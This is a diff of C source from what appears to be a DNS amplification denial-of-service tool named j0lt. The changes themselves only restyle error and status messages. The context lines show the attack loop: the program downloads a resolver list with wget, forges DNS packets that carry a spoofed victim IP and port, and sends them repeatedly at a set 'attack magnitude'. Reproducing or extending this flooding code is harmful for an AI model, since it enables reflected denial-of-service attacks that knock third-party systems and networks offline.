@@ -268,58 +268,58 @@ inline static int proceed(
 		pathptr = g_path;
 		s = posix_spawnattr_init(&attr);
 		if (s != 0)
-			err_exit("* posix_spawnattr_init");
+			err_exit("(E) posix_spawnattr_init");
 		s = posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETSIGMASK);
 		if (s != 0)
-			err_exit("* posix_spawnattr_setflags");
+			err_exit("(E) posix_spawnattr_setflags");
 		
 		sigfillset(&mask);
 		s = posix_spawnattr_setsigmask(&attr, &mask);
 		if (s != 0)
-			err_exit("* posix_spawnattr_setsigmask");
+			err_exit("(E) posix_spawnattr_setsigmask");
 		
 		attrp = &attr;
 		
 		s = posix_spawnp(&child_pid, g_wget[0], file_actionsp, attrp, &g_wget[0], environ);
 		if (s != 0)
-			err_exit("* posix_spawn");
+			err_exit("(E) posix_spawn");
 		
 		if (attrp != NULL)
 		{
 			s = posix_spawnattr_destroy(attrp);
 			if (s != 0)
-				err_exit("* posix_spawnattr_destroy");
+				err_exit("(E) posix_spawnattr_destroy");
 		}
 		
 		if (file_actionsp != NULL)
 		{
 			s = posix_spawn_file_actions_destroy(file_actionsp);
 			if (s != 0)
-				err_exit("* posix_spawn_file_actions_destroy");
+				err_exit("(E) posix_spawn_file_actions_destroy");
 		}
 		do
 		{
 			s = waitpid(child_pid, &status, WUNTRACED | WCONTINUED);
 			if (s == -1)
-				err_exit("* waitpid");
+				err_exit("(E) waitpid");
 		}
 		while (!WIFEXITED(status) && !WIFSIGNALED(status));
 	}
-	printf("+ resolv list saved to %s\n", pathptr);
+	printf(COLOR_GREEN "+ resolv list saved to %s\n" COLOR_RESET, pathptr);
 	
 	if (read_file_into_mem(pathptr, &resolvlist, &szresolvlist) == false)
-		err_exit("* file read error");
+		err_exit("(E) file read error");
 	if (filereadmode == false)
 	{
 		remove(pathptr);
-		printf("- resolv list removed from %s\n", pathptr);
+		printf(COLOR_GREEN "- resolv list removed from %s\n" COLOR_RESET, pathptr);
 	}
 	
 	while (magnitude >= 1)
 	{
 		nread = 0;
 		resolvptr = (char*)resolvlist;
-		printf("+ current attack magnitude %d \n", magnitude);
+		printf(COLOR_BLUE "+ current attack magnitude " COLOR_YELLOW "%d \n" COLOR_RESET, magnitude);
 		while (nread = readline(lineptr, resolvptr, MAX_LINE_SZ_J0LT, szresolvlist) != 0)
 		{
 			resolvptr += nread;
@@ -331,7 +331,7 @@ inline static int proceed(
 			if (resolvip == 0)
 				continue;
 			szpayload = forge_j0lt_packet(payload, htonl(resolvip), htonl(spoofip), spoofport);
-			if (debugmode == 0)
+			if (debugmode == false)
 			{
 				szpewpew = PEWPEW_J0LT;
 				while (szpewpew-- > 0)
